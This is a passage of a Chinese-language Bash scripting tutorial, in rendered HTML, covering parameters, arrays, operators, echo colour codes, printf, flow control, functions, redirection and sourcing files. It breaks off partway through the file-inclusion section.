class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;执行的文件名：<span class="hljs-variable">$0</span>&quot;</span>;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第一个参数为：<span class="hljs-variable">$1</span>&quot;</span>;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第二个参数为：<span class="hljs-variable">$2</span>&quot;</span>;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第三个参数为：<span class="hljs-variable">$3</span>&quot;</span>;</span></code></pre></div></div><p><strong>脚本内获取参数的格式为：</strong></p><p>$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……</p><p><strong>另外，还有几个特殊字符用来处理参数：</strong></p><table><thead><tr><th align="center">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center"><code>$#</code></td><td align="left">传递到脚本的参数个数</td></tr><tr><td align="center"><code>$*</code></td><td align="left">以一个单字符串显示所有向脚本传递的参数。如”$*”用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</td></tr><tr><td align="center"><code>$$</code></td><td align="left">脚本运行的当前进程ID号</td></tr><tr><td align="center"><code>$!</code></td><td align="left">后台运行的最后一个进程的ID号</td></tr><tr><td align="center"><code>$@</code></td><td align="left">与<code>$*</code>相同，但是使用时加引号，并在引号中返回每个参数。如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。</td></tr><tr><td align="center"><code>$-</code></td><td align="left">显示Shell使用的当前选项，与set命令功能相同。</td></tr><tr><td align="center"><code>$?</code></td><td align="left">显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">my_array=(A B <span class="hljs-string">&quot;C&quot;</span> D)</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第一个元素为: <span class="hljs-variable">$&#123;my_array[0]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第二个元素为: <span class="hljs-variable">$&#123;my_array[1]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第三个元素为: <span class="hljs-variable">$&#123;my_array[2]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第四个元素为: <span class="hljs-variable">$&#123;my_array[3]&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;数组的元素为: <span class="hljs-variable">$&#123;my_array[*]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;数组的元素为: <span class="hljs-variable">$&#123;my_array[@]&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;数组元素个数为: <span class="hljs-variable">$&#123;#my_array[*]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;数组元素个数为: <span class="hljs-variable">$&#123;#my_array[@]&#125;</span>&quot;</span></span></code></pre></div></div><h2 id="基本运算符"><a href="#基本运算符" class="headerlink" title="基本运算符"></a>基本运算符</h2><blockquote><p>原生 bash 不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。</p></blockquote><p>expr 是一款表达式计算工具，使用它能完成表达式的求值操作。</p><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2加2等于&quot;</span>`expr 2 + 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2减2等于&quot;</span>`expr 2 - 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2乘2等于&quot;</span>`expr 2 \* 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2除2等于&quot;</span>`expr 2 / 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2除2取余&quot;</span>`expr 2 % 2`</span></code></pre></div></div><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=10</span><span class="line">b=20</span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -eq <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测两个数是否相等，相等返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -ne <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测两个数是否不相等，不相等返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测左边的数是否大于右边的，如果是，则返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测左边的数是否小于右边的，如果是，则返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -ge <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测左边的数是否大于等于右边的，如果是，则返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -le <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测左边的数是否小于等于右边的，如果是，则返回 true。</span></span></code></pre></div></div><h3 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">if</span> [ ! <span class="hljs-literal">false</span> ]       <span class="hljs-comment"># 非运算，返回 true</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-literal">true</span> -o <span class="hljs-literal">false</span> ] <span class="hljs-comment"># 或运算，返回 true</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-literal">true</span> -a <span class="hljs-literal">false</span> ] <span class="hljs-comment"># 与运算，返回 false</span></span></code></pre></div></div><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=10</span><span class="line">b=20</span><span class="line"><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ]]   <span class="hljs-comment"># 逻辑的 AND, 返回 false</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ] &amp;&amp; [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 逻辑的 AND, 返回 false</span></span><span class="line"><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> || <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ]]   <span class="hljs-comment"># 逻辑的 OR, 返回 true</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ] || [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 逻辑的 OR, 返回 true</span></span></code></pre></div></div><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=<span class="hljs-string">&quot;abc&quot;</span></span><span class="line">b=<span class="hljs-string">&quot;efg&quot;</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> = <span class="hljs-variable">$b</span> ]   <span class="hljs-comment"># 检测两个字符串是否相等，相等返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> ]  <span class="hljs-comment"># 检测两个字符串是否相等，不相等返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$a</span> ]     <span class="hljs-comment"># 检测字符串长度是否为0，为0返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span> ]   <span class="hljs-comment"># 检测字符串长度是否为0，不为0返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> ]        <span class="hljs-comment"># 检测字符串是否为空，不为空返回 true。</span></span></code></pre></div></div><h3 id="文件测试运算符"><a href="#文件测试运算符" class="headerlink" title="文件测试运算符"></a>文件测试运算符</h3><p>文件测试运算符用于检测 Unix 文件的各种属性。</p><table><thead><tr><th align="center">操作符</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">-b file</td><td align="left">检测文件是否是块设备文件，如果是，则返回 true。</td></tr><tr><td align="center">-c file</td><td align="left">检测文件是否是字符设备文件，如果是，则返回 true。</td></tr><tr><td align="center">-d file</td><td align="left">检测文件是否是目录，如果是，则返回 true。</td></tr><tr><td align="center">-f file</td><td align="left">检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td></tr><tr><td align="center">-g file</td><td align="left">检测文件是否设置了 SGID 位，如果是，则返回 true。</td></tr><tr><td align="center">-k file</td><td align="left">检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td></tr><tr><td align="center">-p file</td><td align="left">检测文件是否是有名管道，如果是，则返回 true。</td></tr><tr><td align="center">-u file</td><td align="left">检测文件是否设置了 SUID 位，如果是，则返回 true。</td></tr><tr><td align="center">-r file</td><td align="left">检测文件是否可读，如果是，则返回 true。</td></tr><tr><td align="center">-w file</td><td align="left">检测文件是否可写，如果是，则返回 true。</td></tr><tr><td align="center">-x file</td><td align="left">检测文件是否可执行，如果是，则返回 true。</td></tr><tr><td align="center">-s file</td><td align="left">检测文件是否为空（文件大小是否大于0），不为空返回 true。</td></tr><tr><td align="center">-e file</td><td align="left">检测文件（包括目录）是否存在，如果是，则返回 true。</td></tr></tbody></table><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;It is a test&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> It is a <span class="hljs-built_in">test</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\&quot;It is a test\&quot;&quot;</span>      <span class="hljs-comment"># 转义</span></span><span class="line">name=Chris</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$name</span> is handsome&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;OK! \n&quot;</span>             <span class="hljs-comment"># 显示换行 -e 开启转义</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;It is a test&quot;</span> &gt; myfile <span class="hljs-comment"># 显示结果定向至文件</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$name\&quot;&#x27;</span>               <span class="hljs-comment"># 原样输入字符串，不进行转义或取变量（使用单引号）</span></span><span class="line"><span class="hljs-built_in">echo</span> `date`                  <span class="hljs-comment"># 显示命令执行结构</span></span></code></pre></div></div><h3 id="颜色显示"><a href="#颜色显示" class="headerlink" title="颜色显示"></a>颜色显示</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-taggerscript codeBlockLines"><span class="line">echo -e &quot;<span class="hljs-symbol">\0</span>33[字背景颜色；文字颜色m字符串<span class="hljs-symbol">\0</span>33[0m&quot;</span><span class="line"></br></span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[30m 黑色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[31m 红色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[32m 绿色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[33m 黄色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[34m 蓝色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[35m 紫色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[36m 天蓝字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[37m 白色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line"></br></span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[40;37m 黑底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[41;37m 红底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[42;37m 绿底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[43;37m 黄底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[44;37m 蓝底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[45;37m 紫底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[46;37m 天蓝底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[47;30m 白底黑字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line"></br></span><span class="line"><span class="hljs-symbol">\3</span>3[0m 关闭所有属性</span><span class="line"><span class="hljs-symbol">\3</span>3[1m 设置高亮度</span><span class="line"><span class="hljs-symbol">\3</span>3[4m 下划线</span><span class="line"><span class="hljs-symbol">\3</span>3[5m 闪烁</span><span class="line"><span class="hljs-symbol">\3</span>3[7m 反显</span><span class="line"><span class="hljs-symbol">\3</span>3[8m 消隐</span><span class="line"><span class="hljs-symbol">\3</span>3[30m — <span class="hljs-symbol">\3</span>3[37m 设置前景色</span><span class="line"><span class="hljs-symbol">\3</span>3[40m — <span class="hljs-symbol">\3</span>3[47m 设置背景色</span><span class="line"><span class="hljs-symbol">\3</span>3[nA 光标上移n行</span><span class="line"><span class="hljs-symbol">\3</span>3[nB 光标下移n行</span><span class="line"><span class="hljs-symbol">\3</span>3[nC 光标右移n行</span><span class="line"><span class="hljs-symbol">\3</span>3[nD 光标左移n行</span><span class="line"><span class="hljs-symbol">\3</span>3[y;xH设置光标位置</span><span class="line"><span class="hljs-symbol">\3</span>3[2J 清屏</span><span class="line"><span class="hljs-symbol">\3</span>3[K 清除从光标到行尾的内容</span><span class="line"><span class="hljs-symbol">\3</span>3[s 保存光标位置</span><span class="line"><span class="hljs-symbol">\3</span>3[u 恢复光标位置</span><span class="line"><span class="hljs-symbol">\3</span>3[?25l 隐藏光标</span><span class="line"><span class="hljs-symbol">\3</span>3[?25h 显示光标</span></code></pre></div></div><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4s\n&quot;</span> 姓名 性别 体重kg  </span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭靖 男 66.1234</span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 杨过 男 48.6543</span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭芙 女 47.9876</span></code></pre></div></div><p>结果：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" codeBlockLines"><span class="line">姓名     性别   体重kg</span><span class="line">郭靖     男      66.12</span><span class="line">杨过     男      48.65</span><span class="line">郭芙     女      47.99</span></code></pre></div></div><blockquote><p><code>%s %c %d %f</code> 都是格式替代符<br><code>d</code>: Decimal 十进制整数 – 对应位置参数必须是十进制整数，否则报错！<br><code>s</code>: String 字符串 – 对应位置参数必须是字符串或者字符型，否则报错！<br><code>c</code>: Char 字符 – 对应位置参数必须是字符串或者字符型，否则报错！<br><code>f</code>: Float 浮点 – 对应位置参数必须是数字型，否则报错！<br><code>%-10s</code> 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐）,任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。<br><code>%-4.2f</code> 指格式化为小数，其中.2指保留2位小数。</p></blockquote><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">num1=100</span><span class="line">num2=100</span><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> $[num1] -eq $[num2]</span></code></pre></div></div><h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=10</span><span class="line">b=20</span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> ]</span><span class="line"><span class="hljs-keyword">then</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a 等于 b&quot;</span></span><span class="line"><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ]</span><span class="line"><span class="hljs-keyword">then</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a 大于 b&quot;</span></span><span class="line"><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ]</span><span class="line"><span class="hljs-keyword">then</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a 小于 b&quot;</span></span><span class="line"><span class="hljs-keyword">else</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;没有符合的条件&quot;</span></span><span class="line"><span class="hljs-keyword">fi</span></span></code></pre></div></div><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">for</span> loop <span class="hljs-keyword">in</span> 1 2 3 4 5</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The value is: <span class="hljs-variable">$loop</span>&quot;</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="while"><a href="#while" class="headerlink" title="while"></a>while</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">int=1</span><span class="line"><span class="hljs-keyword">while</span>(( <span class="hljs-variable">$int</span>&lt;=5 ))</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$int</span></span><span class="line">    <span class="hljs-built_in">let</span> <span class="hljs-string">&quot;int++&quot;</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="case"><a href="#case" class="headerlink" title="case"></a>case</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;输入 1 到 4 之间的数字:&#x27;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你输入的数字为:&#x27;</span></span><span class="line"><span class="hljs-built_in">read</span> aNum</span><span class="line"><span class="hljs-keyword">case</span> <span class="hljs-variable">$aNum</span> <span class="hljs-keyword">in</span></span><span class="line">    1)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你选择了 1&#x27;</span></span><span class="line">    ;;</span><span class="line">    2)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你选择了 2&#x27;</span></span><span class="line">    ;;</span><span class="line">    3)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你选择了 3&#x27;</span></span><span class="line">    ;;</span><span class="line">    4)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你选择了 4&#x27;</span></span><span class="line">    ;;</span><span class="line">    *)  <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;你没有输入 1 到 4 之间的数字&#x27;</span></span><span class="line">    ;;</span><span class="line"><span class="hljs-keyword">esac</span></span></code></pre></div></div><h3 id="break"><a href="#break" class="headerlink" title="break"></a>break</h3><p>break命令允许跳出所有循环（终止执行后面的所有循环）。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">while</span> :</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;输入 1 到 5 之间的数字:&quot;</span></span><span class="line">    <span class="hljs-built_in">read</span> aNum</span><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-variable">$aNum</span> <span class="hljs-keyword">in</span></span><span class="line">        1|2|3|4|5) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你输入的数字为 <span class="hljs-variable">$aNum</span>!&quot;</span></span><span class="line">        ;;</span><span class="line">        *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你输入的数字不是 1 到 5 之间的! 游戏结束&quot;</span></span><span class="line">            <span class="hljs-built_in">break</span></span><span class="line">        ;;</span><span class="line">    <span class="hljs-keyword">esac</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h3><p>跳出当前循环。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">while</span> :</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;输入 1 到 5 之间的数字: &quot;</span></span><span class="line">    <span class="hljs-built_in">read</span> aNum</span><span class="line">    <span class="hljs-keyword">case</span> <span class="hljs-variable">$aNum</span> <span class="hljs-keyword">in</span></span><span class="line">        1|2|3|4|5) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你输入的数字为 <span class="hljs-variable">$aNum</span>!&quot;</span></span><span class="line">        ;;</span><span class="line">        *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;你输入的数字不是 1 到 5 之间的!&quot;</span></span><span class="line">            <span class="hljs-built_in">continue</span></span><span class="line">            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;游戏结束&quot;</span></span><span class="line">        ;;</span><span class="line">    <span class="hljs-keyword">esac</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="until"><a href="#until" class="headerlink" title="until"></a>until</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"></br></span><span class="line">a=0</span><span class="line"></br></span><span class="line">until [ ! <span class="hljs-variable">$a</span> -lt 10 ]</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-variable">$a</span></span><span class="line">   a=`expr <span class="hljs-variable">$a</span> + 1`</span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"></br></span><span class="line"><span class="hljs-function"><span class="hljs-title">funWithParam</span></span>()&#123;</span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第一个参数为 <span class="hljs-variable">$1</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第二个参数为 <span class="hljs-variable">$2</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第十个参数为 <span class="hljs-variable">$10</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第十个参数为 <span class="hljs-variable">$&#123;10&#125;</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第十一个参数为 <span class="hljs-variable">$&#123;11&#125;</span> !&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;参数总数有 <span class="hljs-variable">$#</span> 个!&quot;</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;作为一个字符串输出所有参数 $* !&quot;</span></span><span class="line">&#125;</span><span class="line">funWithParam 1 2 3 4 5 6 7 8 9 34 73</span></code></pre></div></div><p>结果： </p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-tap codeBlockLines"><span class="line">第一个参数为<span class="hljs-number"> 1 </span>!</span><span class="line">第二个参数为<span class="hljs-number"> 2 </span>!</span><span class="line">第十个参数为<span class="hljs-number"> 10 </span>!</span><span class="line">第十个参数为<span class="hljs-number"> 34 </span>!</span><span class="line">第十一个参数为<span class="hljs-number"> 73 </span>!</span><span class="line">参数总数有<span class="hljs-number"> 11 </span>个!</span><span class="line">作为一个字符串输出所有参数<span class="hljs-number"> 1 </span>2<span class="hljs-number"> 3 </span>4<span class="hljs-number"> 5 </span>6<span class="hljs-number"> 7 </span>8<span class="hljs-number"> 9 </span>34<span class="hljs-number"> 73 </span>!</span></code></pre></div></div><h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">who &gt; today.log <span class="hljs-comment"># 执行结果覆盖到文件 today.log</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;菜鸟教程：www.runoob.com&quot;</span> &gt;&gt; today.log <span class="hljs-comment"># 执行结果追加到文件 today.log</span></span><span class="line">wc -l &lt; today.log <span class="hljs-comment"># 统计 today.log 行数</span></span><span class="line">wc -l &lt;&lt; <span class="hljs-string">EOF</span></span><span class="line"><span class="hljs-string">    李白</span></span><span class="line"><span class="hljs-string">    苏轼</span></span><span class="line"><span class="hljs-string">    王勃</span></span><span class="line"><span class="hljs-string">EOF</span></span></code></pre></div></div><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>test1.sh</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">name=<span class="hljs-string">&quot;Chris&quot;</span></span></code></pre></div></div><p>test2.sh</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-comment">#使用 . 号来引用test1.sh 文件</span></span><span class="line">. ./test1.sh</span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 或者使用以下包含文件代码</span></span><span class="line"><span class="hljs-comment"># 